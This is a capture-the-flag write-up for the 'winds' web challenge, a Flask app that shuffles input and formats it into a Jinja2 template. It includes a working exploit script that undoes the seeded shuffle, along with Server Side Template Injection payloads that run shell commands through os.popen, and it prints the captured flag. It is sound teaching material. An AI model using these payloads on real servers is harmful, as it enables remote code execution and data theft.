# winds - Web

### Challenge description

### Challenge code

```python
import random

from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)

@app.get('/')
def root():
    return render_template_string('''
        <link rel="stylesheet" href="/style.css">
        <div class="content">
            <h1>The windy hills</h1>
            <form action="/shout" method="POST">
                <input type="text" name="text" placeholder="Hello!">
                <input type="submit" value="Shout your message...">
            </form>
            <div style="color: red;">{{ error }}</div>
        </div>
    ''', error=request.args.get('error', ''))

@app.post('/shout')
def shout():
    text = request.form.get('text', '')
    if not text:
        return redirect('/?error=No message provided...')

    random.seed(0)
    jumbled = list(text)
    random.shuffle(jumbled)
    jumbled = ''.join(jumbled)

    return render_template_string('''
        <link rel="stylesheet" href="/style.css">
        <div class="content">
            <h1>The windy hills</h1>
            <form action="/shout" method="POST">
                <input type="text" name="text" placeholder="Hello!">
                <input type="submit" value="Shout your message...">
            </form>
            <div style="color: red;">{{ error }}</div>
            <div>
                Your voice echoes back: %s
            </div>
        </div>
    ''' % jumbled, error=request.args.get('error', ''))

@app.get('/style.css')
def style():
    return '''
        html, body { margin: 0 }
        .content {
            padding: 2rem;
            width: 90%;
            max-width: 900px;
            margin: auto;
            font-family: Helvetica, sans-serif;
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }
    '''
```


---

### Solution

We are given a tiny Flask application serving HTML pages. The all point of the website is to take a user input in form, shuffle the characters and print it back to the user. There isn't much possibilities of exploit here. No database, no login nor session, no cookies, etc... 

Let’s take a look at what’s going on when the user submit an input. The form is going the make a `POST` request on the `/shout` route. The route itself redirect with an error message if no message is provided. Otherwise, it seed the random number generator with 0, shuffle a list containing our input and then format a template string with it. And our exploit will take place here. 
The template string is formatted using python string formatting operator `%` and not by passing the user input as argument of `render_template_string`.
This means we will able to write code and it will be directly interpret by Jinja2, the rendering engine used by Flask under the hood. This is an exploit known as Server Side Template Injection (SSTI). 

The way the server shuffe our input is not a problem as python pseudo-random number generator is seeded and we are given the value !

Let’s write a script to confirm our exploit. 

```python
import random
import requests
import argparse
random.seed(0)

def shuffle_input(input):
    indexes_jumbled = list(range(len(input)))
    random.shuffle(indexes_jumbled)
    ssti_jumbled = ""

    # By seeding python PRNG with the same value as the server
    # we can shuffle our SSTI input in a way that will make the server
    # unshuffle it and make Jinja evaluate our code.
    for i, j in enumerate(input):
        ssti_jumbled += input[indexes_jumbled.index(i)]

    return ssti_jumbled

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("input", type=str)
    args = parser.parse_args()

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    # Jinja2 evaluate code inside tag block
    input = "{{" + args.input + "}}"
    data = shuffle_input(input)

    response = requests.post('https://winds.web.actf.co/shout', headers=headers, data={"text": data})

    print("Status code: ", response.status_code)
    print("Response: ", response.text)
```

To increase my feedback loop, i submit the payload directly in my script and i print the response.

```
$ python exploit.py "2 * 3"
Status code:  200
Response:  
        <link rel="stylesheet" href="/style.css">
        <div class="content">
            <h1>The windy hills</h1>
            <form action="/shout" method="POST">
                <input type="text" name="text" placeholder="Hello!">
                <input type="submit" value="Shout your message...">
            </form>
            <div style="color: red;"></div>
            <div>
                Your voice echoes back: 6
            </div>
        </div>
```
We got `6` ! We made the server do the math for us. Now we have a proper explotation, let’s get the flag.

First, we need to list all the files in the current working directory of the application. We have to trick a little bit because we cannot write proper python code inside Jinja2 tags. For example we can’t do `import os; os.popen('ls').read()`.
```
$ python exploit.py "self.__init__.__builtins__.__import__('os').popen('ls').read()"
Status code:  200
Response:  
        <link rel="stylesheet" href="/style.css">
        <div class="content">
            <h1>The windy hills</h1>
            <form action="/shout" method="POST">
                <input type="text" name="text" placeholder="Hello!">
                <input type="submit" value="Shout your message...">
            </form>
            <div style="color: red;"></div>
            <div>
                Your voice echoes back: app.py
flag.txt
requirements.txt

            </div>
        </div>
```

Nice, three files, `app.py`, `requirements.txt` and `flag.txt`.
```
$ python exploit.py "self.__init__.__builtins__.__import__('os').popen('cat flag.txt').read()"
Status code:  200
Response:  
        <link rel="stylesheet" href="/style.css">
        <div class="content">
            <h1>The windy hills</h1>
            <form action="/shout" method="POST">
                <input type="text" name="text" placeholder="Hello!">
                <input type="submit" value="Shout your message...">
            </form>
            <div style="color: red;"></div>
            <div>
                Your voice echoes back: actf{2cb542c944f737b85c6bb9183b7f2ea8}

            </div>
        </div>
```

Flag !
